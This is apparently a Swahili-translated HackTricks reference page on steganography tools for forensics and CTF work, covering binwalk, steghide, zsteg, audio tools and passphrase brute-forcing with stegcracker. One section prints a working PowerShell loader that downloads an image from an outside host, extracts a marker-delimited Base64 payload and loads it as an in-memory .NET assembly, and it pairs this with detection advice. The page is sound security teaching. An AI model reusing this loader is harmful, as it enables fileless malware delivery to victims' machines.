# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Kutoa Data kutoka kwa Mafaili**

### **Binwalk**

Chombo cha kutafuta mafaili ya binary kwa ajili ya mafaili yaliyofichwa na data zilizowekwa ndani. Inasakinishwa kupitia `apt` na chanzo chake kinapatikana kwenye [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Inarejesha faili kwa msingi wa vichwa na viambatisho vya mwisho, muhimu kwa picha za png. Imewekwa kupitia `apt` na chanzo chake kiko kwenye [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Husaidia kuangalia metadata ya faili, inapatikana [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Sawa na exiftool, kwa kuangalia metadata. Inaweza kusakinishwa kupitia `apt`, chanzo kwenye [GitHub](https://github.com/Exiv2/exiv2), na ina [tovuti rasmi](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Tambua aina ya file unayoshughulikia.

### **Strings**

Hutoa strings zinazoweza kusomwa kutoka kwenye files, ukitumia mipangilio mbalimbali ya encoding kuchuja matokeo.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Ulinganisho (cmp)**

Inafaa kwa kulinganisha faili iliyobadilishwa na toleo lake la asili lililopatikana mtandaoni.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Kutoa Data Zilizofichwa katika Maandishi**

### **Data Zilizofichwa katika Nafasi**

Tabia zisizoonekana katika nafasi zinazoonekana tupu zinaweza kuficha taarifa. Ili kuchota data hii, tembelea [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Kutoa Data kutoka kwa Picha**

### **Kutambua Maelezo ya Picha kwa GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) hutumika kubaini aina za faili za picha na kugundua uharibifu unaowezekana. Endesha amri hapa chini ili kuchunguza picha:
```bash
./magick identify -verbose stego.jpg
```
Ili kujaribu kutengeneza picha iliyoharibika, kuongeza maoni ya metadata kunaweza kusaidia:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide kwa Kuficha Data**

Steghide inaruhusu kuficha data ndani ya faili za `JPEG, BMP, WAV, and AU`, na inaweza kuingiza na kutoa data iliyosimbwa. Ufungaji ni rahisi kwa kutumia `apt`, and its [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Amri:**

- `steghide info file` inaonyesha kama faili ina data iliyofichwa.
- `steghide extract -sf file [--passphrase password]` hutoa data iliyofichwa; nenosiri hiari.

Kwa uondoaji wa mtandaoni, tembelea [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Ili kujaribu password cracking kwa Steghide, tumia [stegcracker](https://github.com/Paradoxis/StegCracker.git) kama ifuatavyo:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg kwa Faili za PNG na BMP**

zsteg imejikita katika kugundua data iliyofichwa katika faili za PNG na BMP. Ufungaji unafanywa kwa `gem install zsteg`, chanzo chake kipo kwenye [GitHub](https://github.com/zed-0xff/zsteg).

**Amri:**

- `zsteg -a file` inaendesha mbinu zote za ugunduzi kwenye faili.
- `zsteg -E file` inabainisha payload kwa ajili ya uchimbaji wa data.

### **StegoVeritas na Stegsolve**

**stegoVeritas** hukagua metadata, hufanya mabadiliko ya picha, na hutumia LSB brute forcing miongoni mwa vipengele vingine. Tumia `stegoveritas.py -h` kupata orodha kamili ya chaguzi na `stegoveritas.py stego.jpg` kutekeleza ukaguzi wote.

**Stegsolve** inatumia vichujio vya rangi mbalimbali kufichua maandishi au ujumbe uliyojificha ndani ya picha. Inapatikana kwenye [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT kwa Ugunduo wa Maudhui Yaliyojificha**

Mbinu za Fast Fourier Transform (FFT) zinaweza kufichua maudhui yaliyojificha katika picha. Rasilimali muhimu ni pamoja na:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy kwa Faili za Sauti na Picha**

Stegpy inaruhusu kuingiza taarifa ndani ya faili za picha na sauti, ikiunga mkono miundo kama PNG, BMP, GIF, WebP, na WAV. Inapatikana kwenye [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck kwa Uchambuzi wa Faili za PNG**

Kuchambua faili za PNG au kuthibitisha uhalali wao, tumia:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Vifaa vya Ziada kwa Uchambuzi wa Picha**

Kwa uchunguzi zaidi, zingatia kutembelea:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Marker-delimited Base64 payloads hidden in images (malware delivery)

Commodity loaders kwa wingi zaidi zinaficha Base64-encoded payloads kama plain text ndani ya picha ambazo vinginevyo ni halali (mara nyingi GIF/PNG). Badala ya LSB ya ngazi ya pikseli, payload hutenganishwa na mfuatano maalum wa alama za kuanza/kuisha zilizowekwa ndani ya maandishi/metadata ya faili. Kisha PowerShell stager itafanya:

- Inapakua picha kupitia HTTP(S)
- Inatafuta mfuatano wa alama (mifano iliyoshuhudiwa: <<sudo_png>> … <<sudo_odt>>)
- Inatoa maandishi yaliyo kati na Base64-decodes hadi bytes
- Inaleta .NET assembly in-memory na ku-invoke entry method inayojulikana (hakuna faili imeandikwa kwenye disk)

Snippet ndogo ya PowerShell ya carving/loading
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Vidokezo
- Hii inagawanywa chini ya ATT&CK T1027.003 (steganography). Marker strings hutofautiana kati ya kampeni.
- Uchunguzi: skana picha zilizopakuliwa kutafuta delimiters zinazojulikana; tambulisha `PowerShell` inayotumia `DownloadString` ikifuatiwa na `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Kutoa Data kutoka kwenye Faili za Sauti**

**Audio steganography** inatoa njia ya kipekee ya kuficha taarifa ndani ya mafaili ya sauti. Zana tofauti zinatumika kwa kuingiza au kupata tena maudhui yaliyofichwa.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide ni zana yenye matumizi mengi iliyoundwa kuficha data katika mafaili ya JPEG, BMP, WAV, na AU. Maelekezo ya kina yamepewa katika [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Zana hii inaendana na muundo mbalimbali ikiwemo PNG, BMP, GIF, WebP, na WAV. Kwa maelezo zaidi, rejea [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg ni muhimu kwa kutathmini uadilifu wa mafaili ya sauti, kuonyesha taarifa za kina na kubaini utofauti wowote.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg ni mzuri katika kuficha na kutoa data ndani ya faili za WAV kwa kutumia least significant bit strategy. Inapatikana kwenye [GitHub](https://github.com/ragibson/Steganography#WavSteg). Amri ni pamoja na:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound inaruhusu encryption na detection ya taarifa ndani ya sound files kwa kutumia AES-256. Inaweza kupakuliwa kutoka [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Chombo cha thamani kwa uchunguzi wa kuona na uchambuzi wa faili za sauti, Sonic Visualizer kinaweza kufichua vipengele vilivyofichika ambavyo haviwezi kubainika kwa njia nyingine. Tembelea [official website](https://www.sonicvisualiser.org/) kwa maelezo zaidi.

### **DTMF Tones - Dial Tones**

Kugundua DTMF tones katika faili za sauti kunaweza kufanywa kwa kutumia zana za mtandaoni kama [this DTMF detector](https://unframework.github.io/dtmf-detect/) na [DialABC](http://dialabc.com/sound/detect/index.html).

## **Mbinu Nyingine**

### **Binary Length SQRT - QR Code**

Data ya binary ambayo mzizi wa mraba (sqrt) wa urefu wake ni nambari kamili inaweza kuwakilisha QR code. Tumia kipande hiki cha msimbo kukagua:
```python
import math
math.sqrt(2500) #50
```
Kwa kubadilisha binary kuwa picha, angalia [dcode](https://www.dcode.fr/binary-image). Ili kusoma QR codes, tumia [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Tafsiri ya Braille**

Kwa kutafsiri Braille, [Branah Braille Translator](https://www.branah.com/braille-translator) ni rasilimali bora.

## **Marejeleo**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
